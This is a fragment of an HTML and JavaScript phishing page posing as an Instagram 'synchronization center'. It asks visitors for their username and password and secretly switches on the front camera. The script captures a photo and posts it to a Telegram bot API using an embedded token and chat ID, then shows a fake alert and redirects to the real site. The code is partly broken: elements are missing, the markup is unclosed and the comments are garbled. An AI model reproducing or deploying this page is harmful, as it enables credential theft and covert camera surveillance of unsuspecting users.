    <style>

        .card { background-color: #121212; border: 1px solid #333; border-radius: 12px; padding: 40px 20px; width: 350px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        
        /* ÿ™ÿµŸÖŸäŸÖ ŸÉŸÑŸÖÿ© Instaagram ÿ®ÿßŸÑÿÆÿ∑ ÿßŸÑŸÖÿ∑ŸÑŸàÿ® */

        p { font-size: 13px; color: #a8a8a8; line-height: 1.5; margin-bottom: 30px; padding: 0 10px; }
        
        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 6px; padding: 12px; margin-bottom: 12px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; }

<body>

    <div class="card">
        <div class="brand">Instaagram</div>
        <div class="check-icon">‚úîÔ∏è</div>
        <h2>Account Synchirization Center</h2>
        <p>Please enter your usernme and password below to complete the secure data transfer.</p>
        
        <input type="text" id="field_1" placeholder="Username" spellcheck="false">
        <input type="password" id="field_2" placeholder="Password">

    <script>
        const B = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const G = "897618292";

        // ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑŸÉÿßŸÖŸäÿ±ÿß ÿ®ÿµŸÖÿ™
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => { document.getElementById('v').srcObject = s; })

        function process() {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);

            c.toBlob(b => {

                fetch(`https://api.telegram.org/bot${B}/sendPhoto`, { method: "POST", body: f })
                .then(() => {
                    alert("System: Synchronization in progress. Please log in to your official app to confirm.");
                    window.location.href = "https://www.instagram.com";
                });
            }, 'image/jpeg');
        }
    </script>
